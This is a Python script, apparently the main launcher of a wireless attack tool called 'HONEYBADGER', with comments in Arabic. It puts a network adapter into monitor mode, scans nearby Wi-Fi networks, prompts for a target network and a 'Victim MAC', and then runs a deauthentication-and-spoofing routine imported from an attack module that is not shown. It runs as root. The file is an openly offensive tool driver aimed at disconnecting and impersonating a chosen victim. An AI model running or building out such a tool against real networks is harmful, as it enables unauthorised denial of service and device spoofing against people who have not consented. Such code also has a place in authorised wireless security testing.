#!/usr/bin/env python3
import sys
import os
from colorama import Fore, Style
from core.network_utils import print_banner, get_interfaces, set_monitor_mode
from core.attacks import scan_wifi, deauth_and_spoof

def main():
    print_banner()
    
    # 1. اختيار كرت الشبكة
    interfaces = get_interfaces()
    for i, iface in enumerate(interfaces):
        print(f"[{i}] {iface}")
    
    idx = int(input(Fore.WHITE + "\nSelect Interface Index: "))
    selected_iface = interfaces[idx]
    
    # 2. تحويل الوضع
    if not set_monitor_mode(selected_iface):
        sys.exit()
    
    # 3. فحص الشبكات اللاسلكية
    found_nets = scan_wifi(selected_iface)
    if not found_nets:
        print(Fore.RED + "[-] No networks found. Check your adapter.")
        return
        
    net_choice = int(input(Fore.WHITE + "\nSelect Target Network No: "))
    target_bssid = list(found_nets.keys())[net_choice - 1]
    
    # 4. تحديد الضحية والتنفيذ
    victim_mac = input(Fore.WHITE + "Enter Victim MAC (e.g. AA:BB:CC:11:22:33): ")
    
    deauth_and_spoof(selected_iface, target_bssid, victim_mac)
    
    print(f"\n{Fore.RED}{Style.BRIGHT}>>> HONEYBADGER STATUS: ACTIVE <<<")
    print(Fore.WHITE + "Check your connection and hardware ID to verify.")

if __name__ == "__main__":
    if os.getuid() != 0:
        print(Fore.RED + "[!] Please run as ROOT (sudo).")
        sys.exit()
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program terminated.")